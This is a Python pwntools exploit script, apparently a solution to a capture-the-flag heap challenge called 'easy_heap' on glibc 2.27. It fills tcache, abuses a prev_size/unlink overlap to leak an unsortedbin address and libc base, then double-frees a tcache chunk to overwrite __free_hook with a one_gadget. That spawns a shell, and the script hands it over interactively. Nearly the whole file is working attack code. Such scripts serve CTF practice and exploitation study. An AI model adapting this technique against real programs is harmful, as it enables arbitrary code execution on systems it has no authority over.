from pwn import *
context(os="linux", arch="amd64")

DEBUG = 1
LOCAL = 1

def debug_on():
	context.log_level = "debug"

ld_name = "/glibc/2.27/64/lib/ld-2.27.so"
g_fname = "./easy_heap"
g_elf = ELF(g_fname)
g_libcname =  "/glibc/2.27/64/lib/libc-2.27.so" if LOCAL else "./libc64.so"

if (LOCAL):
	g_io = process([ld_name, g_fname])
else:
	g_io = remote()

g_libc = ELF(g_libcname)

def getpid():
	if (DEBUG & LOCAL):
		log.info("PID: %d", g_io.proc.pid)
		pause()

s, sa, sl, sla = g_io.send, g_io.sendafter, g_io.sendline, g_io.sendlineafter
r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline

def opt(idx):
	sla("?\n> ", str(idx))

def add(size, content):
	opt(1)
	sla("size \n> ", str(size))
	if (len(content) >= size):
		sa("content \n> ", content)
	else:
		sla("content \n> ", content)
		
def delete(idx):
	opt(2)
	sla("index \n> ", str(idx))

def show(idx):
	opt(3)
	sla("index \n> ", str(idx))

def pwn():
	# Part 1: leak
	for i in range(10):
		add(0x10, str(i)+'\n')
	# filling tcache
	for i in range(6):
		delete(i)
	delete(9) # prevent chunk merge into heap's top
	# now tcache is full
	
	delete(6) # put chunk_B into unsortedbin
	delete(7) # put chunk_A into unsortedbin, trigger unlink, modify chunk_C.prev_size = 0x200, clean chunk_C.size's LSB
	delete(8)
	 
	# empty tcache, so the following malloc will get chunk from bins.
	# They take idx=[0, 1, 2, 3, 4, 5, 6]
	for i in range(7):
		add(0x10, str(i)+'\n')
	
	# now tcache is empty
	add(0x10, "A, from unsortedbin, idx=7")
	add(0x10, "B, from unsrotedbin, idx=8") 
	add(0x10, "C, from unsortedbin, idx=9")

	for i in range(6):
		delete(i)
	delete(8) # put chunk_B into tcache's top
	# now tcache is full.
	delete(7) # put chunk_A into unsortedbin

	add(0xf8, "Get B from tcache, idx=0, and clear C's prev_in_use bit.")
	delete(6) # now tcache is full
	delete(9) # free chunk_C, trigger unlink

	# empty tcache, take idx=[1, 7]
	for i in range(7):
		add(0x10, str(i) + "from tcache")
	
	# reallocate A by spliting unsortedbin. write B's fd and bk
	add(0x10, "Get A from unsortedbin, idx=8")

	# leak
	show(0)
	addr_ub = u64(rl()[:-1].ljust(8, b'\0'))
	g_libc.address = addr_ub - 96 -  0x3afc40
	off_one_gadget = 0xdeec2 if LOCAL else 0x4f2c5
	one_gadget = g_libc.address + off_one_gadget 
	log.success("unsortedbin@%#x\nlibc@%#x\none_gadget@%#x", addr_ub, g_libc.address, one_gadget)

	# Part 2, tcache double free hijack __free_hook
	getpid()
	# tcache should remain empty
	add(0xf8, "double allocate B by spliting, idx=8")
	
	for i in range(1, 6):
		delete(i)
	# double free B
	delete(0)
	delete(9)

	# add(0x8, p64(g_libc.symbols["__realloc_hook"])) # idx=0
	add(0x8, p64(g_libc.symbols["__free_hook"])) # idx=0
	add(0x8, "none")		# idx=1
	# cannot read '\x00', so only the first 6 bytes of one_gadget will be read.
	# add(0x10, p64(one_gadget) + p64(g_libc.symbols["realloc"] + 2))

	# trigger one_gadget
	delete(1)
	# add(0x20, "getshell")

if ("__main__" == __name__):
	debug_on()
	pwn()
	g_io.interactive()

